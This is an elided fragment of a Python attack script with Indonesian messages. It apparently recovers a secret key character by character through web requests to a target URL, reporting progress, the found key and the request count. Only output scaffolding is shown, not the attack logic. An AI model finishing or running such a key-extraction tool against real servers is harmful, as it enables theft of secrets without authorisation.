...
def get_key(session):
    ...
    print("proses menyerang " + args.url)
    print(
        "untuk menemukan kunci panjang [" +
        str(key_length) +
        "] dengan ambang akurasi [" +
        str(args.accuracy) +
        "]"
    )
    print(
        "menggunakan charset kunci [" +
        (
            key_charset
            if unprintable is False
            else '- all ASCII -'
    ...
    for i in range(int(key_length)):
        ...
        sys.stdout.write("Posisi kunci " + pos_str + ": (------")
        sys.stdout.flush()
        ...
        if keychar is not False:
            ...
            sys.stdout.write("\b"*7 + "Tidak ditemukan, berhenti\n")
            sys.stdout.flush()
            break
    if keychar is not False:
        print("Kunci yang ditemukan: " +
              (
                found
                if unprintable is False
    ...
    print("Total permintaan web: " + str(requests_sent))
    return found
